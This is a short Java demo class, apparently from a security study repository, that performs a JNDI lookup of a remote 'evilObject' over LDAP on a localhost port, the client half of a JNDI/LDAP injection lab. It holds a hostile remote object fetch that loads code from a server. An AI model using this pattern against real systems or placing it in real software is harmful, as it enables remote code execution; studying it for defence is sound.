package org.h3rmesk1t.JNDI.LDAPAttack;

import javax.naming.InitialContext;
import javax.naming.NamingException;

/**
 * @Author: H3rmesk1t
 * @Data: 2022/2/7 7:03 上午
 */
public class JNDIClient {

    public static void main(String[] args) throws NamingException {

        new InitialContext().lookup("ldap://127.0.0.1:6666/evilObject");
    }
}
